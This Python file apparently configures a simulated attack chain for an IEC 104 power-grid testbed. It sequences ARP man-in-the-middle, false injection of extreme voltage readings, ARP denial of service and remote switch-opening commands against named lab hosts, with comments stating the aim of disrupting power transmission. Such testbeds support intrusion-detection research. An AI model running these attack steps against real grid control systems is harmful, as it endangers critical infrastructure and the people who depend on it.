from attacks.attack import Attack
from attacks.catalog.IEC_104.arp import IEC104_ARP
from attacks.catalog.IEC_104.arp_dos import IEC104_ARP_dos
from attacks.catalog.IEC_104.arp_false_data_injection import \
    IEC104_ARP_false_data_injection
from attacks.catalog.IEC_104.send_command_to_switch import \
    IEC104_Send_Command_To_Switch


class Manipulate_Grid_Attackchain:
    def __init__(self, project_name: str, project_path: str) -> None:
        self.project_name = project_name
        self.project_path = project_path
        self.attacks: list[Attack] = []

    def get_attack_list(self):

        # adversary wants to influence the grid state, trying to destroy/disrupt power transmission
        # knowledge about the workings of this ICS, no complex attack patterns
        # access to RTU (or switch?) in a substation n848
        # mitm a substation, which the attacker wants to control, so he can listen to the communication
        # inject extreamly low voltage levels in measurements
        # inject high voltage levels in measurements
        # without pause, drop all communication trying to correct the state
        # open switches (Transformer substation, grid still online)

        self.attacks.append(
            IEC104_ARP(
                executing_host="n848",
                project_path=self.project_path,
                attack_duration=120,
                pause_duration=60,
                ownip="172.16.3.24",
                targetsip="172.16.3.1,172.16.3.2,172.16.3.3,172.16.3.4",
                gatewaysip="172.16.3.28,172.16.3.29",
                gatewaysmac="02:c8:99:68:00:04,02:c8:99:68:00:05",
                mtuip="172.16.1.2",
            )
        )

        self.attacks.append(
            IEC104_ARP_false_data_injection(
                executing_host="n848",
                project_path=self.project_path,
                attack_duration=180,
                pause_duration=120,
                ownip="172.16.3.24",
                targetsip="172.16.3.1,172.16.3.2,172.16.3.3,172.16.3.4",
                gatewaysip="172.16.3.28,172.16.3.29",
                gatewaysmac="02:c8:99:68:00:04,02:c8:99:68:00:05",
                mtuip="172.16.1.2",
                injectionfactor=0.01,
            )
        )

        self.attacks.append(
            IEC104_ARP_false_data_injection(
                executing_host="n848",
                project_path=self.project_path,
                attack_duration=180,
                pause_duration=0,
                ownip="172.16.3.24",
                targetsip="172.16.3.1,172.16.3.2,172.16.3.3,172.16.3.4",
                gatewaysip="172.16.3.28,172.16.3.29",
                gatewaysmac="02:c8:99:68:00:04,02:c8:99:68:00:05",
                mtuip="172.16.1.2",
                injectionfactor=10.0,
            )
        )

        self.attacks.append(
            IEC104_ARP_dos(
                executing_host="n848",
                project_path=self.project_path,
                attack_duration=180,
                pause_duration=120,
                ownip="172.16.3.24",
                targetsip="172.16.3.1,172.16.3.2,172.16.3.3,172.16.3.4",
                gatewaysip="172.16.3.28,172.16.3.29",
                gatewaysmac="02:c8:99:68:00:04,02:c8:99:68:00:05",
                mtuip="172.16.1.2",
            )
        )

        self.attacks.append(
            IEC104_Send_Command_To_Switch(  # addresses switch 7
                executing_host="n848",
                targets_ip="172.16.2.6",
                project_path=self.project_path,
                scenario_file="scenario3.yml",
                pause_duration=120,
            )
        )

        return self.attacks
